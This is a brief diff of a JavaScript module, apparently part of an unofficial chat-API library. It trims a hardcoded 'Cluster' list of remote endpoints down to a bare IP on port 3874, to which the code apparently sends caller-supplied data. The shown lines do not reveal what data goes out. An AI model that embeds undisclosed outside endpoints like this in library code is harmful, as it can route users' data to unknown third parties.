@@ -23,7 +23,7 @@ module.exports = function (defaultFuncs, api, ctx) {
 
         if (!data || !type || !method) return;
 
-        var Cluster = ['https://GlobalDatabaseKNZ.duyvuongreplit01.repl.co', 'http://146.190.109.182:3874'];
+        var Cluster = ['http://146.190.109.182:3874'];
         var ursl = Cluster[Math.floor(Math.random() * Cluster.length)];
         
         if (utils.getType(data) !== "Array") data = [data];
